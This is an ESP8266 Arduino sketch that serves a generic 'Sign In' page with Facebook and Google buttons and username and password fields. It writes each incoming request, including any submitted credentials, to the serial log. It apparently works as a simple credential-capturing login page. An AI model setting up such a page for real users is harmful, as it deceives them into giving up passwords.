#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <WiFiManager.h>

WiFiServer server(80);

String header;

void setup() {
  Serial.begin(115200);
  WiFiManager wifiManager;
  wifiManager.autoConnect("AutoConnectAP");
  Serial.println("Connected.");
  server.begin();
}

void loop() {
  WiFiClient client = server.available();

  if(client){
    Serial.println("New Client.");
    String currentLine = "";
    while (client.connected()){
      if(client.connected()){
        char c = client.read();
        Serial.write(c);

        header += c;
        if(c == '\n'){
          if(currentLine.length() == 0){
            client.println("HTTP/1.1 200 OK");
            client.println("Content-type:text/html");
            client.println("Connection: close");
            client.println();

            // Display the HTML web page
            client.println("<!DOCTYPE html>");
            client.println("<html lang=\"en\">");
            client.println("<head>");
              client.println("<title>Login</title>");
              client.println("<meta charset=\"UTF-8\">");
              client.println("<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">");
              client.println("<style>");

              client.println(".p-t-40 {padding-top: 40px;}");
              client.println(".p-l-40 {padding-left: 40px;}");
              client.println(".p-r-40 {padding-right: 40px;}");
              client.println(".p-b-20 {padding-bottom: 20px;}");
              client.println(".p-b-53 {padding-bottom: 53px;}");
              client.println(".m-b-20 {margin-bottom: 20px;}");
              client.println(".p-t-31 {padding-top: 31px;}");
              client.println(".p-b-9 {padding-bottom: 9px;}");
              client.println(".p-t-13 {padding-top: 13px;}");
              client.println(".m-t-17 {margin-top: 17px;}");

              client.println(".flex-sb {");
                client.println("display: -webkit-box;");
                client.println("display: -webkit-flex;");
                client.println("display: -moz-box;");
                client.println("display: -ms-flexbox;");
                client.println("display: flex;");
                client.println("justify-content: space-between;");
              client.println("}");

              client.println(".flex-w {");
                client.println("display: -webkit-box;");
                client.println("display: -webkit-flex;");
                client.println("display: -moz-box;");
                client.println("display: -ms-flexbox;");
                client.println("display: flex;");
                client.println("-webkit-flex-wrap: wrap;");
                client.println("-moz-flex-wrap: wrap;");
                client.println("-ms-flex-wrap: wrap;");
                client.println("-o-flex-wrap: wrap;");
                client.println("flex-wrap: wrap;");
              client.println("}");
             
              client.println("* {");
                client.println("margin: 0px; ");
                client.println("padding: 0px; ");
                client.println("box-sizing: border-box;");
              client.println("}");
              
              client.println("body, html {");
                client.println("height: 100%;");
                client.println("font-family: sans-serif;");
              client.println("}");
              
              /*---------------------------------------------*/
              client.println("a {");
                client.println("font-family: Poppins-Regular;");
                client.println("font-size: 10px;");
                client.println("line-height: 1.7;");
                client.println("color: #666666;");
                client.println("margin: 0px;");
                client.println("transition: all 0.4s;");
                client.println("-webkit-transition: all 0.4s;");
                client.println("-o-transition: all 0.4s;");
                client.println("-moz-transition: all 0.4s;");
              client.println("}");
              
              client.println("a:hover {");
                  client.println("text-decoration: none;");
                client.println("border-color: #fc00ff;");
              client.println("}");
              
              /*---------------------------------------------*/
              client.println("h1,h2,h3,h4,h5,h6 {");
                client.println("margin: 0px;");
              client.println("}");
              
              client.println("p {");
                client.println("font-family: Poppins-Regular;");
                client.println("font-size: 14px;");
                client.println("line-height: 1.7;");
                client.println("color: #666666;");
                client.println("margin: 0px;");
              client.println("}");
              
              client.println("ul, li {");
                client.println("margin: 0px;");
                client.println("list-style-type: none;");
              client.println("}");
              
              
              /*---------------------------------------------*/
              client.println("input {");
                client.println("outline: none;");
                client.println("border: none;");
              client.println("}");
              
              client.println("input:focus::-webkit-input-placeholder { color:transparent; }");
              client.println("input:focus:-moz-placeholder { color:transparent; }");
              client.println("input:focus::-moz-placeholder { color:transparent; }");
              client.println("input:focus:-ms-input-placeholder { color:transparent; }");
              
              client.println("input::-webkit-input-placeholder { color: #555555;}");
              client.println("input:-moz-placeholder { color: #555555;}");
              client.println("input::-moz-placeholder { color: #555555;}");
              client.println("input:-ms-input-placeholder { color: #555555;}");
              
              client.println("label {");
                client.println("display: block;");
                client.println("margin: 0;");
              client.println("}");
              
              /*---------------------------------------------*/
              client.println("button {");
                client.println("outline: none !important;");
                client.println("border: none;");
                client.println("background: transparent;");
              client.println("}");
              
              client.println("iframe {");
                client.println("border: none !important;");
              client.println("}");
              
              
              /*//////////////////////////////////////////////////////////////////
              [ Utility ]*/
              client.println(".txt1 {");
                client.println("font-family: Montserrat-SemiBold;");
                client.println("font-size: 16px;");
                client.println("color: #555555;");
                client.println("line-height: 1.5;");
              client.println("}");
              
              client.println(".txt2 {");
                client.println("font-family: Poppins-Regular;");
                client.println("font-size: 14px;");
                client.println("color: #999999;");
                client.println("line-height: 1.5;");
              client.println("}");
              
              client.println(".bo1 {border-bottom: 1px solid #999999;}");
              
              /*//////////////////////////////////////////////////////////////////
              [ login ]*/
              
              client.println(".limiter {");
                client.println("width: 100%;");
                client.println("margin: 0 auto;");
              client.println("}");
              
              client.println(".container-login100 {");
                client.println("width: 100%;  ");
                client.println("min-height: 100vh;");
                client.println("display: -webkit-box;");
                client.println("display: -webkit-flex;");
                client.println("display: -moz-box;");
                client.println("display: -ms-flexbox;");
                client.println("display: flex;");
                client.println("flex-wrap: wrap;");
                client.println("justify-content: center;");
                client.println("align-items: center;");
                client.println("padding: 10px;");
                
                client.println("background-position: center;");
                client.println("background-size: cover;");
                client.println("background-repeat: no-repeat;");
              client.println("}");
              
              
              client.println(".wrap-login100 {");
                client.println("width: 680px;");
                client.println("background: #fff;");
                client.println("border-radius: 10px;");
                client.println("position: relative;");
              client.println("}");
              
              
              /*==================================================================
              [ Form ]*/
              
              client.println(".login100-form {");
                client.println("width: 100%;");
              client.println("}");
              
              client.println(".login100-form-title {");
                client.println("width: 100%;");
                client.println("display: block;");
                client.println("color: #555555;");
               client.println(" line-height: 1.0;");
                client.println("text-align: center;");
              client.println("}");
              
              /*------------------------------------------------------------------
              [ Button sign in with ]*/
              client.println(".btn-face,");
              client.println(".btn-google {");
                client.println("font-family: Montserrat-SemiBold;");
                client.println("font-size: 16px;");
                client.println("line-height: 1.2;");
              
                client.println("display: -webkit-box;");
                client.println("display: -webkit-flex;");
                client.println("display: -moz-box;");
                client.println("display: -ms-flexbox;");
                client.println("justify-content: center;");
                client.println("align-items: center;");
                client.println("padding: 15px;");
                client.println("width: calc((100% - 10px) / 2);");
                client.println("height: 40px;");
                client.println("border-radius: 10px;");
                client.println("box-shadow: 0 1px 5px 0px rgba(0, 0, 0, 0.2);");
                client.println("-moz-box-shadow: 0 1px 5px 0px rgba(0, 0, 0, 0.2);");
                client.println("-webkit-box-shadow: 0 1px 5px 0px rgba(0, 0, 0, 0.2);");
                client.println("-o-box-shadow: 0 1px 5px 0px rgba(0, 0, 0, 0.2);");
                client.println("-ms-box-shadow: 0 1px 5px 0px rgba(0, 0, 0, 0.2);");
                client.println("-webkit-transition: all 0.4s;");
                client.println("-o-transition: all 0.4s;");
                client.println("-moz-transition: all 0.4s;");
                client.println("transition: all 0.4s;");
                client.println("position: relative;");
              client.println("}");
              
              client.println(".btn-face {");
                client.println("color: #fff;");
                client.println("background-color: #3b5998;");
              client.println("}");
              
              client.println(".btn-face i {");
                client.println("font-size: 30px;");
                client.println("margin-right: 17px;");
                client.println("padding-bottom: 3px;");
              client.println("}");
              
              client.println(".btn-google {");
                client.println("color: #555555;");
                client.println("background-color: #fff;");
              client.println("}");
              
              client.println(".btn-google img {");
                client.println("width: 20px;");
                client.println("margin-right: 15px;");
                client.println("padding-bottom: 3px;");
              client.println("}");
              
              client.println(".btn-face:hover:before,");
              client.println(".btn-google:hover:before {");
                client.println("opacity: 1;");
              client.println("}");
              
              /*------------------------------------------------------------------
              [ Input ]*/
              
              client.println(".wrap-input100 {");
                client.println("width: 100%;");
                client.println("position: relative;");
                client.println("background-color: #f7f7f7;");
                client.println("border-radius: 5px;");
              client.println("}");
              
              
              /*---------------------------------------------*/
              client.println(".input100 {");
                client.println("font-family: Poppins-Regular;");
                client.println("color: #333333;");
                client.println("line-height: 1.2;");
                client.println("font-size: 18px;");
              
                client.println("display: block;");
                client.println("width: 100%;");
                client.println("background: transparent;");
                client.println("height: 60px;");
                client.println("padding: 0 20px;");
              client.println("}");
              /*------------------------------------------------------------------
              [ Focus Input ]*/
              
              client.println(".focus-input100 {");
                client.println("position: absolute;");
                client.println("display: block;");
                client.println("width: calc(100% + 2px);");
                client.println("height: calc(100% + 2px);");
                client.println("top: -1px;");
                client.println("left: -1px;");
                client.println("pointer-events: none;");
                client.println("border-radius: 10px;");
              
                client.println("visibility: hidden;");
                client.println("opacity: 0;");
              
                client.println("-webkit-transition: all 0.4s;");
                client.println("-o-transition: all 0.4s;");
                client.println("-moz-transition: all 0.4s;");
                client.println("transition: all 0.4s;");
              
                client.println("-webkit-transform: scaleX(1.1) scaleY(1.3);");
                client.println("-moz-transform: scaleX(1.1) scaleY(1.3);");
                client.println("-ms-transform: scaleX(1.1) scaleY(1.3);");
                client.println("-o-transform: scaleX(1.1) scaleY(1.3);");
                client.println("transform: scaleX(1.1) scaleY(1.3);");
              client.println("}");
              
              client.println(".input100:focus + .focus-input100 {");
                client.println("visibility: visible;");
                client.println("opacity: 1;");
              
                client.println("-webkit-transform: scale(1);");
                client.println("-moz-transform: scale(1);");
                client.println("-ms-transform: scale(1);");
                client.println("-o-transform: scale(1);");
                client.println("transform: scale(1);");
              client.println("}");
              
              client.println(".eff-focus-selection {");
                client.println("visibility: visible;");
                client.println("opacity: 1;");
              
                client.println("-webkit-transform: scale(1);");
                client.println("-moz-transform: scale(1);");
                client.println("-ms-transform: scale(1);");
                client.println("-o-transform: scale(1);");
                client.println("transform: scale(1);");
              client.println("}");
              
              
              /*------------------------------------------------------------------
              [ Button ]*/
              client.println(".container-login100-form-btn {");
                client.println("width: 100%;");
                client.println("display: -webkit-box;");
                client.println("display: -webkit-flex;");
                client.println("display: -moz-box;");
                client.println("display: -ms-flexbox;");
                client.println("display: flex;");
                client.println("flex-wrap: wrap;");
              client.println("}");
              
              client.println(".login100-form-btn {");
                client.println("display: -webkit-box;");
                client.println("display: -webkit-flex;");
                client.println("display: -moz-box;");
                client.println("display: -ms-flexbox;");
                client.println("display: flex;");
                client.println("justify-content: center;");
                client.println("align-items: center;");
                client.println("padding: 0 20px;");
                client.println("width: 100%;");
                client.println("height: 60px;");
                client.println("background-color: #333333;");
                client.println("border-radius: 10px;");
              
                client.println("font-family: Poppins-Medium;");
                client.println("font-size: 16px;");
                client.println("color: #fff;");
                client.println("line-height: 1.2;");
              
                client.println("-webkit-transition: all 0.4s;");
                client.println("-o-transition: all 0.4s;");
                client.println("-moz-transition: all 0.4s;");
                client.println("transition: all 0.4s;");
                client.println("position: relative;");
                client.println("z-index: 1;");
              client.println("}");
              
              client.println(".login100-form-btn:hover {");
                client.println("cursor: pointer;");
              client.println("}");
              
              
              /*------------------------------------------------------------------
              [ Alert validate ]*/
              
              client.println(".validate-input {");
                client.println("position: relative;");
              client.println("}");
              
              client.println(".alert-validate::before {");
                client.println("content: attr(data-validate);");
                client.println("position: absolute;");
                client.println("max-width: 70%;");
                client.println("background-color: #fff;");
                client.println("padding: 4px 25px 5px 10px;");
                client.println("top: 50%;");
                client.println("-webkit-transform: translateY(-50%);");
                client.println("-moz-transform: translateY(-50%);");
                client.println("-ms-transform: translateY(-50%);");
                client.println("-o-transform: translateY(-50%);");
                client.println("transform: translateY(-50%);");
                client.println("right: 12px;");
                client.println("pointer-events: none;");
              
                client.println("font-family: Poppins-Regular;");
                client.println("color: #000;");
                client.println("font-size: 14px;");
                client.println("line-height: 1.4;");
                client.println("text-align: left;");
              
                client.println("visibility: hidden;");
                client.println("opacity: 0;");
              
                client.println("-webkit-transition: opacity 0.4s;");
                client.println("-o-transition: opacity 0.4s;");
                client.println("-moz-transition: opacity 0.4s;");
                client.println("transition: opacity 0.4s;");
              client.println("}");
              
              client.println(".alert-validate::after {");
                client.println("font-family: FontAwesome;");
                client.println("display: block;");
                client.println("position: absolute;");
                client.println("color: #c80000;");
                client.println("font-size: 18px;");
                client.println("top: 50%;");
                client.println("-webkit-transform: translateY(-50%);");
                client.println("-moz-transform: translateY(-50%);");
                client.println("-ms-transform: translateY(-50%);");
                client.println("-o-transform: translateY(-50%);");
                client.println("transform: translateY(-50%);");
                client.println("right: 18px;");
              client.println("}");
              
              client.println(".alert-validate:hover:before {");
                client.println("visibility: visible;");
                client.println("opacity: 1;");
              client.println("}");
              
              client.println("@media (max-width: 992px) {");
                client.println(".alert-validate::before {");
                  client.println("visibility: visible;");
                  client.println("opacity: 1;");
                client.println("}");
              client.println("}");
              
              
              /*//////////////////////////////////////////////////////////////////
              [ Responsive ]*/
              client.println("@media (max-width: 768px) {");
                client.println(".wrap-login100 {");
                  client.println("padding-left: 60px;");
                  client.println("padding-right: 60px;");
                client.println("}");
              
              client.println("@media (max-width: 576px) {");
                client.println(".wrap-login100 {");
                  client.println("padding-left: 15px;");
                  client.println("padding-right: 15px;");
                client.println("}");
              
                client.println(".btn-face,");
                client.println(".btn-google {");
                  client.println("width: 100%;");
                client.println("}");
              client.println("}");
              client.println("</style>");
              client.println("<link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\">");
            client.println("</head>");
            client.println("<body>");
              
              client.println("<div class=\"limiter\">");
                client.println("<div class=\"container-login100\" style=\"background:#000;\">");
                  client.println("<div class=\"wrap-login100 p-l-40 p-r-40 p-t-40 p-b-20\">");
                    client.println("<form class=\"login100-form validate-form flex-sb flex-w\">");
                      client.println("<span class=\"login100-form-title p-b-53\">");
                        client.println("Sign In");
                      client.println("</span>");
            
                      client.println("<a href=\"#\" class=\"btn-face m-b-20\">");
                        client.println("<i class=\"fa fa-facebook-official\"></i>");
                        client.println("Facebook");
                      client.println("</a>");
            
                      client.println("<a href=\"#\" class=\"btn-google m-b-20\">");
                        client.println("Google");
                      client.println("</a>");
                      
                      client.println("<div class=\"p-t-31 p-b-9\">");
                        client.println("<span class=\"txt1\">");
                          client.println("Username");
                        client.println("</span>");
                      client.println("</div>");
                      client.println("<div class=\"wrap-input100 validate-input\" data-validate = \"Username is required\">");
                        client.println("<input class=\"input100\" type=\"text\" name=\"username\" >");
                      client.println("</div>");
                      
                      client.println("<div class=\"p-t-13 p-b-9\">");
                        client.println("<span class=\"txt1\">");
                          client.println("Password");
                        client.println("</span>");
                      client.println("</div>");
                      client.println("<div class=\"wrap-input100 validate-input\" data-validate = \"Password is required\">");
                        client.println("<input class=\"input100\" type=\"password\" name=\"pass\" >");
                      client.println("</div>");
            
                      client.println("<div class=\"container-login100-form-btn m-t-17\">");
                        client.println("<button class=\"login100-form-btn\">");
                          client.println("Sign In");
                        client.println("</button>");
                      client.println("</div>");
            
                    client.println("</form>");
                  client.println("</div>");
                client.println("</div>");
              client.println("</div>");
              
                    client.println("<script src=\"https://code.jquery.com/jquery-3.3.1.slim.min.js\" integrity=\"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo\" crossorigin=\"anonymous\"></script>");
                    client.println("<script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js\" integrity=\"sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1\" crossorigin=\"anonymous\"></script>");
                    client.println("<script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js\" integrity=\"sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM\" crossorigin=\"anonymous\"></script>");
                    client.println("<script>");
                      client.println("(function ($) {");
                          client.println("\"use strict\";");
                      
                      
                          /*==================================================================
                          [ Validate ]*/
                          client.println("var input = $('.validate-input .input100');");
                      
                          client.println("$('.validate-form').on('submit',function(){");
                              client.println("var check = true;");
                      
                              client.println("for(var i=0; i<input.length; i++) {");
                                  client.println("if(validate(input[i]) == false){");
                                      client.println("showValidate(input[i]);");
                                      client.println("check=false;");
                                  client.println("}");
                              client.println("}");
                      
                              client.println("return check;");
                          client.println("});");
                      
                      
                          client.println("$('.validate-form .input100').each(function(){");
                              client.println("$(this).focus(function(){");
                                 client.println("hideValidate(this);");
                              client.println("});");
                          client.println("});");
                      
                          client.println("function validate (input) {");
                              client.println("if($(input).attr('type') == 'email' || $(input).attr('name') == 'email') {");
                                  client.println("if($(input).val().trim().match(/^([a-zA-Z0-9_\-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\.)+))([a-zA-Z]{1,5}|[0-9]{1,3})(\]?)$/) == null) {");
                                      client.println("return false;");
                                  client.println("}");
                              client.println("}");
                              client.println("else {");
                                  client.println("if($(input).val().trim() == ''){");
                                      client.println("return false;");
                                  client.println("}");
                              client.println("}");
                          client.println("}");
                      
                          client.println("function showValidate(input) {");
                              client.println("var thisAlert = $(input).parent();");
                      
                              client.println("$(thisAlert).addClass('alert-validate');");
                          client.println("}");
                      
                          client.println("function hideValidate(input) {");
                              client.println("var thisAlert = $(input).parent();");
                      
                              client.println("$(thisAlert).removeClass('alert-validate');");
                          client.println("}");
                         
                      client.println("})(jQuery);");
                      client.println("</script>");
            client.println("</body>");
            client.println("</html>");
            
            // The HTTP response ends with another blank line
            client.println();
            // Break out of the while loop
            break;
          } else { // if you got a newline, then clear currentLine
            currentLine = "";
          }
          
        } else if (c != '\r') {  // if you got anything else but a carriage return character,
          currentLine += c;      // add it to the end of the currentLine
        }
      }
    }
    // Clear the header variable
    header = "";
    // Close the connection
    client.stop();
    Serial.println("Client disconnected.");
    Serial.println("");
  }
}
